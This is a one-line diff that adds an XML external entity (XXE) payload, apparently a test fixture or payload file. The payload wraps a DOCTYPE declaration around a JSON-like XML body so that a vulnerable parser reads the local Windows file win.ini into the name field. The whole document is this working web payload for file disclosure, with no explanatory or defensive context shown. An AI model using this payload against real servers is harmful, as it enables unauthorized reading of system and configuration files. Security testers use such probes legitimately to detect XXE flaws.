@@ -1,0 +1,1 @@
+<!DOCTYPE json [<!ENTITY secret SYSTEM 'file:///C:/Windows/win.ini'>]><json object="true"><name>&secret;</name></json>
